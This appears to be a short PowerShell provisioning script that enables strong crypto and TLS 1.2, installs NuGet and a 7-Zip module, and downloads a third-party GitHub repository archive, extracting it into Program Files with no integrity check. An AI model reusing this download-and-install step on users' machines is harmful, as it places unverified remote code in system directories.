measure-command {

Set-ItemProperty -Path 'HKLM:\SOFTWARE\Wow6432Node\Microsoft\.NetFramework\v4.0.30319' -Name 'SchUseStrongCrypto' -Value '1' -Type DWord

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Install-PackageProvider -Name NuGet -force

Install-Module -Name 7Zip4Powershell -force

invoke-webrequest -uri "https://github.com/Admo9/ProJ03/archive/refs/heads/main.zip" -outfile "C:\Users\app64.zip"
Expand-Archive -Path C:\Users\app64.zip -DestinationPath "C:\Program Files\"



} |

select @{n="time";e={$_.Minutes,"Minutes",$_.Seconds,"Seconds",$_.Milliseconds,"Milliseconds" -join " "}}
